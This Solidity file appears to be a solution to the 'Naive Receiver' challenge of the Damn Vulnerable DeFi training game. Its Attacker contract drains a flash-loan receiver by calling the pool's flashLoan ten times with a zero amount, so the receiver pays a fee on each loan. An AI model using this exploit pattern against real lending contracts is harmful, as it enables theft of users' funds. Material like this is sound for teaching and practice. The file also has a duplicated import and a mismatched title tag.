// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./FlashLoanReceiver.sol";
/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attacker {

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(NaiveReceiverLenderPool pool, FlashLoanReceiver target) external {
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
        pool.flashLoan(target, ETH, 0,"0x");
    }

}
